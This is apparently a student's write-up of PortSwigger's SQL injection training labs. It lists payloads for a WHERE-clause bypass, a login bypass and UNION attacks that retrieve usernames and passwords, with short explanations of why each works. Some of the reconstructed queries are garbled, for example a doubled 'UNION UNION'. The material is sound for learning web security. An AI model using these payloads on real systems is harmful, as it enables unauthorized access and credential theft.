# SQL-Injection tests

Note: All the following labs/exercises are performed using the **Burp Suite**.  
Download it at you convenience from https://portswigger.net/

## Lab 1 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data  
Link: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
Payload: **'+OR+1=1--**  
Query produced: "SELECT ....WHERE category = Lifestyle OR 1=1"  
It works because: the where clause evaluates to TRUE regardless of category, since 1=1 is always true (boolean algebra)

## Lab 2  - SQLi vulnerability allowing login bypass  
Link: https://portswigger.net/web-security/sql-injection/lab-login-bypass  
Payload: **administrator'--**  
Assumption(s):  
- username = administrator  
Query produced: SELECT * from users WHERE username = 'administrator'  
It works because: this hack efficiently removed the need of a correct password (bypassing it completely)

## Lab 3,4,5 - SQLi UNION attack, retrieving data from other tables
Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables  
Payload: **'+UNION+SELECT+username,+password+FROM+users--**  
Assumption(s):
- there is a users table with 2 columns (username, password) we try to get data from (alongside the normal data comming from the original select with a category = gifts)  
Query produced: SELECT * from products WHERE category=gifts UNION UNION SELECT username, password FROM users  
It works because: this hack exposes user data togther with normal data from the products category.  
**Lab 4:** We need first to find out the number of columns that the original query fetched using "null":s until the server stoped responding with an error (as in **'+UNION+SELECT+null,null--**). This is also the task in lab 4.  
**Lab 5:** After that we need to find out if the types of our columns match (are similar). So we swap the null types, one at a time for a string type.  
Finally, we make a qualified guess and try with the payload above. The names of the columns in the last union table does not matter, but we call them here "username" and "password" because that's what we assume they are.

## Lab 6 - SQLi UNION attack, retrieving multiple values in a single column
Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column  
Payload: **'UNION SELECT null, username || password FROM users--**  
Assumption(s): same as lab 3,4,5  
Query produced: SELECT * from products WHERE category=gifts UNION UNION SELECT username, password FROM users  
It works because:  
- We could establish that the URL for a product category was vulnerable to SQLi attacks using the **'** character.
- We could find the number of columns that the vulnerability had, using the "order by x", where we substitute x for an integer starting with 1 and increasing it until we get a new server error. We got an error at **'+order+by+3--** which tells us that the number of columns retrieved by the request equals 2.
- We detected which of the columns were actually displaying data (column 2 was the one showing data, ordered alphabetically)
- We detected which columns are of type text using **UNION SELECT null, 'a'--**
- We joined 1 column from the users table using **UNION SELECT null, username FROM users--**
- We detected the type of database we are working with trying out the **different syntaxes for concatenation** (postgreSQL in this case)
- We use the PostgreSQL syntax and fetch both username and password in the same column **UNION SELECT null, username || password FROM users--**
